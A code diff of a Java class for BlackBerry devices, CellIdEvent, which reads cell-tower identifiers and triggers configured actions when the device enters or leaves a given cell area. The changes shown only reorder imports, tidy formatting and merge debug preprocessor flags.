@@ -9,11 +9,6 @@
 package blackberry.event;
 
 import java.io.EOFException;
-import java.io.IOException;
-
-import blackberry.Device;
-import blackberry.debug.Debug;
-import blackberry.debug.DebugLevel;
 
 import net.rim.device.api.system.CDMAInfo;
 import net.rim.device.api.system.GPRSInfo;
@@ -21,6 +16,9 @@ import net.rim.device.api.system.RadioInfo;
 import net.rim.device.api.system.CDMAInfo.CDMACellInfo;
 import net.rim.device.api.system.GPRSInfo.GPRSCellInfo;
 import net.rim.device.api.util.DataBuffer;
+import blackberry.Device;
+import blackberry.debug.Debug;
+import blackberry.debug.DebugLevel;
 
 // TODO: Auto-generated Javadoc
 /**
@@ -53,10 +51,10 @@ public final class CellIdEvent extends Event {
         super(Event.EVENT_CELLID, actionId, confParams, "CellIdEvent");
     }
 
-    protected void actualStart(){
-        entered=true;
+    protected void actualStart() {
+        entered = true;
     }
-    
+
     /*
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
@@ -69,22 +67,23 @@ public final class CellIdEvent extends Event {
 
             final GPRSCellInfo cellinfo = GPRSInfo.getCellInfo();
 
-            mcc = Integer.parseInt(Integer.toHexString(cellinfo.getMCC()));            
+            mcc = Integer.parseInt(Integer.toHexString(cellinfo.getMCC()));
             mnc = cellinfo.getMNC();
             lac = cellinfo.getLAC();
             cid = cellinfo.getCellId();
 
-            int newmcc = RadioInfo.getMCC(RadioInfo.getCurrentNetworkIndex());
-            //#ifdef DEBUG_TRACE
-            debug.trace("actualRun mcc: "+newmcc);
+            final int newmcc = RadioInfo.getMCC(RadioInfo
+                    .getCurrentNetworkIndex());
+            //#ifdef DEBUG
+            debug.trace("actualRun mcc: " + newmcc);
             //#endif
-            
+
             final StringBuffer mb = new StringBuffer();
             mb.append("MCC: " + mcc);
             mb.append(" MNC: " + mnc);
             mb.append(" LAC: " + lac);
             mb.append(" CID: " + cid);
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info(mb.toString());
             //#endif
 
@@ -102,7 +101,7 @@ public final class CellIdEvent extends Event {
             mb.append(" NID: " + nid);
             mb.append(" BID: " + bid);
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info(mb.toString());
             //#endif
 
@@ -116,26 +115,26 @@ public final class CellIdEvent extends Event {
                 && (lacOrig == -1 || lacOrig == lac)
                 && (cidOrig == -1 || cidOrig == cid)) {
             if (!entered) {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Enter");
                 //#endif
                 entered = true;
                 trigger(actionOnEnter);
-            }else{
-                //#ifdef DEBUG_TRACE
+            } else {
+                //#ifdef DEBUG
                 debug.trace("already entered");
                 //#endif
             }
 
         } else {
             if (entered) {
-                //#ifdef DEBUG_INFO
+                //#ifdef DEBUG
                 debug.info("Exit");
                 //#endif
                 entered = false;
                 trigger(actionOnExit);
-            }else{
-                //#ifdef DEBUG_TRACE
+            } else {
+                //#ifdef DEBUG
                 debug.trace("already exited");
                 //#endif
             }
@@ -159,7 +158,7 @@ public final class CellIdEvent extends Event {
             lacOrig = databuffer.readInt();
             cidOrig = databuffer.readInt();
 
-            //#ifdef DEBUG_INFO
+            //#ifdef DEBUG
             debug.info("Mcc: " + mccOrig + " Mnc: " + mncOrig + " Lac: "
                     + lacOrig + " Cid: " + cidOrig);
             //#endif
